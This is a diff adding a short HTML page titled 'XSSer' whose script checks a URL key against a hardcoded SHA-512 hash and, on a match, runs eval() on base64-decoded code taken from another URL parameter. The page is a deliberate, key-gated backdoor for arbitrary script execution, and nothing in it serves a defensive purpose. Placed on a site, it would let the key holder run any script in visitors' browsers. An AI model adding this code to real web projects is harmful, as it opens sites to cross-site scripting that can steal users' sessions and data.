@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html><head><meta charset='UTF-8'><title>XSSer</title>
+  </head>
+  <body>
+    <textarea id='log' wrap='soft' cols='20'>
+    </textarea>
+    <script>
+      const sp = (new URL(location)).searchParams;
+      const buf = (new TextEncoder).encode(sp.get('k') || '').buffer;
+      crypto.subtle.digest('SHA-512', buf)
+        .then(r => new Uint8Array(r))
+        .then(a => Array.from(a, c => `0${c.toString(16)}`.slice(-2)).join(""))
+        .then(h => h === "57d815541048510bb43f0d3418a1e151774d61a404c473bc46000026917b8cc5d180ac1f5382dba02ed3dab4fe6b16577748ff9bff0eaa5bf2e7471a933090b4" ? 1 : Promise.reject(alert("incorrect") || "incorrect"))
+        .then(() => {
+          alert(log.textContent = eval(atob(sp.get('c'))))
+        })
+    </script>
+  </body>
+</html>
